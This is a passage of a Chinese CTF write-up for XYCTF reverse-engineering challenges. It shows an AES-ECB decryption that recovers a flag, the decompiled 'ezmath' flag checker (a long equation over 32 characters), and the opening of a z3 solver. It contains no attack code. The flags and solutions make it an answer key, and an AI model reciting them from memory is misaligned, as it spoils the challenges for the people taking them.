class="token string">b'welcometoxyctf!!'</span>cipher<span class="token operator">=</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_b64decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'XYCTF&#123;y0u_@r3_v3ry_g00d_a7_E_l@ngu@ge&#125;\n\n\n\n\n\n\n\n\n\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezmath"><a class="markdownIt-Anchor" href="#ezmath"></a> ezmath</h3><p>py程序直接解包反编译一条龙</p><p>需要注意的是：用的python版本最好跟需要反编译的pyc版本一致，否则可能导致少部分信息缺失</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># uncompyle6 version 3.9.1</span><span class="token comment"># Python bytecode version base 3.8.0 (3413)</span><span class="token comment"># Decompiled from: Python 3.11.5 | packaged by Anaconda, Inc. | (main, Sep 11 2023, 13:26:23) [MSC v.1916 64 bit (AMD64)]</span><span class="token comment"># Embedded file name: ezmath.py</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"flag:"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">222</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">232</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">226</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">176</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">198</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">134</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">170</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">142</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">230</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">246</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">232</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">174</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">242</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">142</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">170</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">176</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">+</span> <span class="token number">297412</span>        <span class="token operator">==</span> <span class="token number">0</span>    <span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有佬用z3解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 创建⼀个Z3求解器</span>solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 定义32个32位的变量</span>flag0 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token 